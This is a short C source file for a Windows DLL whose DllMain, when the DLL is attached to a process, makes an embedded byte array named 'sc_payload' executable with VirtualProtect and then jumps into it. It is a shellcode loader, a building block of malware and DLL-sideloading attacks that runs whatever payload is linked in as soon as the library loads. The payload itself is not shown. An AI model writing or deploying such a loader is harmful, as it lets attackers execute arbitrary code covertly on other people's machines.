#include <windows.h>

extern unsigned char sc_payload[];
extern unsigned char sc_payload_end[];

#define SC_PAYLOAD_SIZE ((size_t)(sc_payload_end - sc_payload))

BOOL WINAPI DllMain ( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved )
{
    if ( fdwReason == DLL_PROCESS_ATTACH )
    {
        DWORD old = 0;

        if ( VirtualProtect ( sc_payload, SC_PAYLOAD_SIZE, PAGE_EXECUTE_READ, &old ) )
        {
            ( (void (*)(void)) sc_payload ) ();
        }
    }

    return TRUE;
}
